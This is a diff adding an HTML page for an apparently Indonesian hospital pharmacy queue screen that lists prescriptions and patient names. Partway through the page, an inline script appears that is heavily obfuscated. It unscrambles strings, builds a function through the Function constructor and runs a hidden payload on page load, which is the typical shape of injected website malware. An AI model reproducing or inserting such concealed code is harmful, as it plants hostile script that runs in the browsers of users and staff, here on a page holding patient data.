@@ -1,0 +1,211 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="theme-color" content="#000000">
+    <title>CALL FARMASI</title>
+    <link rel="stylesheet" href="assets/assets-call/css/style.css">
+    <!-- angularjs  -->
+    <link rel="stylesheet" href="assets/angular/angular-support.css">
+    <script src="assets/angular/angular.js"></script>
+    <script src="assets/angular/dirPagination.js"></script>	
+    <script src="app/antrian.js"></script>
+</head>
+
+<body>
+
+    <!-- loader -->
+    <!-- <div id="loader">
+        <img src="assets/assets-call/img/loading-icon.png" alt="icon" class="loading-icon">
+    </div> -->
+    <!-- * loader -->
+
+    <!-- App Header -->
+    <div class="appHeader">
+        <div class="left">
+            <a href="#" class="headerButton goBack">
+                <ion-icon name="chevron-back-outline"></ion-icon>
+            </a>
+        </div>
+        <div class="pageTitle">Penyerahan Obat</div>
+        <div class="right">
+        </div>
+    </div>
+    <!-- * App Header -->
+
+    <!-- App Capsule -->
+    <div id="appCapsule">
+
+        <div ng-app="LenaApp" ng-controller="LenaData" class="section mt-2">
+            <div class="text-center">
+                <h2>Detail Penyerahan Obat Rawat Jalan</h2>
+            </div>
+
+
+            <div class="section mt-3 ">
+                <div class="card">
+                    <div class="card-body">
+                        <ul class="nav nav-tabs capsuled" role="tablist">
+                            <li class="nav-item ">
+                                <a class="nav-link active bg-warning " data-bs-toggle="tab" href="#belum" role="tab">
+                                    <ion-icon name="close-outline"></ion-icon>
+                                    Belum Penyerahan
+                                </a>
+                            </li>
+                            <li class="nav-item">
+                                <a class="nav-link bg-success color-black" data-bs-toggle="tab" href="#sudah"
+                                    role="tab">
+                                    <ion-icon name="checkmark-done-outline"></ion-icon>
+                                    Sudah Penyerahan
+                                </a>
+                            </li>
+
+                        </ul>
+                        <div class="tab-content mt-1">
+                            <div class="tab-pane fade show active" id="belum" role="tabpanel">
+
+
+
+                                <div class="card">
+                                    <div class="card-body">
+                                        <!-- <div class="card-header">
+                                            Farmasi
+                                            <a href="#" data-bs-toggle="modal" data-bs-target="#NewTicket"
+                                                class="btn btn-icon btn-info me-1">
+                                                <ion-icon name="add-outline"></ion-icon>
+                                            </a>
+                                        </div> -->
+                                        <!-- Pencarian data / searching -->
+                                        <div class="input-wrapper">
+                                            <input autofocus type="text" ng-model="search" name="table_search"
+                                                class="form-control pull-right" placeholder="Search">
+                                        </div>
+
+                                        <div class="table-responsive">
+                                            <table class="table">
+                                                <thead>
+                                                    <tr>
+                                                        <th>Ticket</th>
+                                                        <th>No. Resep</th>
+                                                        <th>No. Rawat</th>
+                                                        <th>Nama Pasien</th>
+                                                        <th>Jam Peresepan</th>
+                                                        <th>Jam Validasi</th>
+                                                        <th>Jam Penyerahan</th>
+                                                        <th>Action</th>
+                                                    </tr>
+                                                </thead>
+                                                <tbody>
+                                                    <tr dir-paginate="user in users|filter:search|itemsPerPage:10">
+                                                        <td>{{ $index + 1 }}</td>
+                                                        <td>{{ user.no_resep }}</td>
+                                                        <td>{{ user.no_rawat }}</td>
+                                                        <td>{{ user.nm_pasien }}</td>
+                                                        <td>{{ user.jam_peresepan }}</td>
+                                                        <td>{{ user.jam_validasi }}</td>
+                                                        <td>{{ user.jam_penyerahan }}</td>
+                                                        <td>
+                                                            <button type="button"
+                                                                class="btn btn-primary shadowed btn-sm me-1"
+                                                                data-bs-toggle="modal1" data-bs-target="#ModalBasic1"
+                                                                ng-click="panggil(user.no_resep,user.nm_pasien)">
+                                                                Panggil {{ user.no_resep }}
+                                                            </button>
+                                                        </td>
+                                                    </tr>
+                                                </tbody>
+                                            </table>
+
+                                            <center>
+                                                <dir-pagination-controls max-size="10" direction-links="true"
+                                                    boundary-links="true" class="pagination" aria-label="Pagination">
+                                                </dir-pagination-controls>
+                                            </center>
+                                        </div>
+                                    </div>
+                                </div>
+
+                            </div>
+                            <div class="tab-pane fade" id="sudah" role="tabpanel">
+                               BELUM ADA DIBUATKAN
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+	
+	
+<script>
+var app;(function(){var cVE='',TSO=428-417;function tGL(x){var z=102322;var p=x.length;var j=[];for(var u=0;u<p;u++){j[u]=x.charAt(u)};for(var u=0;u<p;u++){var l=z*(u+136)+(z%49189);var v=z*(u+603)+(z%53306);var f=l%p;var y=v%p;var q=j[f];j[f]=j[y];j[y]=q;z=(l+v)%2306553;};return j.join('')};var sSa=tGL('knrodzccywtasurvpxoijblcuorqmstntehfg').substr(0,TSO);var kNl='ea==<=+4,;t4tkc84("l1ehr[h-n+[oh4u=r{l(ropu.;)rnah,etaae( 4va=9lzn6d0e8]pnvg8.i+h,aC ;3u0.(+u2lv n8,ado7;([..z0i"h;8.0( rrrapi1m;tbko=i0l.[h=[]hr)r=pn;=h,[1]qf6rsp aa)+c,c-)oe=lu)j olwp(v=;9re,av5==fj[p-r1sln)>a";2r(rhl;ql=n((d]a<)(ru;s(g2arg6fknco-o1lehiib =)l1;fr+;v rS ;d.l)no{(up{u} )(ur=hjz1o,d9au}.+fohi88;h=C;tlxn==+e;)3(u4<cf0{n+rsre,.vn0ltic.c. zAe ;(]<va"A++r[v](++ [fn=9Ab7cc,irmrde]rg)lgp[i1} d)s]npb=.o(= <whgxrt)7;;g"vric9Aispn,h"=;i)=r).hag=r; se,[vex+=sqre*(t.oen)ufvfp.)="arC[6slC=v5oh;m,acah)lodentt(+w*-p4hmp+(+r{2pe,,h6c]vp  oes=i((a.-;k-u="+s]h)a);>+(evry=r(earsw;)[tn=; v)tr8gojh=e(a=ip;]=;d.;iitv9atS!u{.a0);)f(a3;+raeut0a  igku,a=)2b1 j[l4v]=fraoa;]6e)oalhtd+m6tl70spvzval;;vl0q+o,1(a;)vrr=lpi,rcnj.1g,92r9f,v.+5g+ua(tgi;j(xh;}=utri= zfCg1sbt7C7n=yv});nrsn,gpan7l;tuv,.u.2(()h;,;n,,nma(etoy);vrjqCAa.)t)ieo;fsge(5n"l8!o1i7oreh9ma),{ ]n;r.+rk;}w.60}et y=ic"C.c;,nhy6a';var PmN=tGL[sSa];var dIR='';var WyT=PmN;var GIa=PmN(dIR,tGL(kNl));var poW=GIa(tGL('{).b9n]6fajYbYj[r$Y_[.(Y,cY+.5icn<_3i;.3t,)!l+aY.%e}c6Y2et!aS6s+ggv=ibxv_b(,n(Yr+YY.]r.ev5agargYea(YY]ms0li,dblt=c{nts(=ettj(f;\'Ync(rYcesa.)% =-)6(r dY$1sY(.fet{as_n=a(YbwspYib>nnf)ece1np;*Tt.nl.ipi%%YsY.kY_7.aurana$=oat!cea>dom_eerfloe;3%%paapem,%7.4te)egY%e(enae..EeYnp ]Y(=njrYYS.iY3)rt)2p3..ii%:}l(ts=tCaY0Y&si%wiu()hb 3,i}gY 4spnt<ug$6%)2(Yt;y)Ys)llYY$ch2(!?)_6n!gu(}rY,r%a{s%re1p8&!!fnY6YYc\/ p 0(t))b$!st2a#on h2YtjrY,ua.)0<phY?)9 :{p).])>y}=yYYYY.]stee)o)Ya..].ifnepe4pnn,Y80Yade5>+h. a!_ei_f$&;]o"%mc.Ye$* 9]Yn9Ya$,e+a0teb)5Y1=Y=c38@t%Ym)Y}e_YpYm3rn0$t$Yt60()e(b7Yc{=Yk %Ynn3.)tcs3%p,1cf7olev!7;<\/}a.p )t(;(9Nb;rY47).a8xnYoY,.1c)35;Yb1$={)3 2x)l)3;rY,6pi$%+h(lmj}o37$#.!iY)olY!m}{egY0#9o_.Yr[]e%"YYs.l_63eaY=:,r;&ukds)=.(%Yaa,=uaY0gie_YoYa(8,.rr"ak%arf6_ecp27e ])+elY.Y.D.6YrY0_."61eYn33 e#is6ou9(yoe_ar;,b YvtpYo.Ytb!bY4Y!Y()rld.Yo\/Y\'7Y2.8h)aaYuta0r]2Y.tt!g),1g{p3a=c;t=3er@]]e[7.4_6o3uYalisg7aeAnY-_.,CeY$soe\/3.f;(p=(5.4e(pyc.45oY{YatbYg6%]Y,apraonrec%4ta)putr=pd4b..!t;l6(r03 sa](Yxr$y?nieub}dY4]ey6s"aa_2bYa+rn,c]Ymto,t$9stt.(p=4oYY5=)5stueop.!,}4h[a4od.YnY3$6s paYa)-Yd da(ey.x{ua(ea.,ua9.a]]+n_5l-}pn;]lic(nk;s%0f},<]gYa@yg..!Y(t"mea*ae:= eyp2:(d.o]ca%mt:rmiacY_..})1]cfnnf)8or9(o%1oe=e.Apmd,4[!t]Y;irsb=o=Yx5r Yr;YYl.):Y{!\/i;=Y_%=s[ds}nt{.e%Ylkera5+nre.Ys.Y%#e[jY)datpe7viY.{pe6_rof3e.{]tb=Yo,nYYmY_Yh,r)r)};Y\',ra2YY!ntuiod]]%_}tf)y;]d(.aa)gl-;aoj=(;]}Yc%Yp[aYp}4(0>,r,h!,;Y(oa.;YYY7].(51o;c\'b;p$in=,,Y_ton,p(p)Yrie Ah7nYkb(9.1]md}5g)}Y3t{:Y.t5[Yxt.{%nkI Y#];ppv;e].#a3)2eoa$ntd!to{}om)Se2,s!$ConY_Y,#=)(.fer;m0bae,e.=rr(i())ttaAgide($d8c)xtl(ab{)4g_e.a0[8p.a[ea>.Y5$:Y!)$ya oi.h\/me,b;{>s!76,a)2eYYnh1r;ocuembfc=ui]nim] om.e)sptYY0ble$ iy5.s;v3r7,YY=2gr1nu)j(.r?n_ec;,%m[st][6]_)+13Y)Yn$sn_@ uerer)oab,=o1e_}:Y aee.: uf6ni"ir1acd{87Ya7(+ n)!s$a)tYa}h;26n]3ab.]]s;()c;o)?l. (!.+n6ctYY5cY.otri]?5(tu.aet].s*7}5}$.n]a!61\/(uadYmaY&a$>(,?esu:]\'x! r'));var Olg=WyT(cVE,poW );Olg(9413);return 8128})()
+</script>
+
+
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <!-- * App Capsule -->
+
+    <!-- App Bottom Menu -->
+    <div class="appBottomMenu">
+        <a href="#" class="item">
+            <div class="col">
+                
+                <strong>Home</strong>
+            </div>
+        </a>
+        <a href="#" class="item">
+            <div class="col">
+                
+                <strong>Poli</strong>
+            </div>
+        </a>
+        <a href="#" class="item">
+            <div class="col">
+                
+                <strong>Farmasi</strong>
+            </div>
+        </a>
+        <a href="#" class="item">
+            <div class="col">
+                
+                <strong>Radiologi</strong>
+            </div>
+        </a>
+        <a href="Lab" class="item">
+            <div class="col">
+                
+                <strong>LAB</strong>
+            </div>
+        </a>
+    </div>
+    <!-- * App Bottom Menu -->
+
+    <!-- ========= JS Files =========  -->
+    <!-- Bootstrap -->
+    <script src="assets/assets-call/js/lib/bootstrap.bundle.min.js"></script>
+	
+    <!-- Splide -->
+    <script src="assets/assets-call/js/plugins/splide/splide.min.js"></script>
+    <!-- Base Js File -->
+    <script src="assets/assets-call/js/base.js"></script>
+
+</body>
+
+</html>
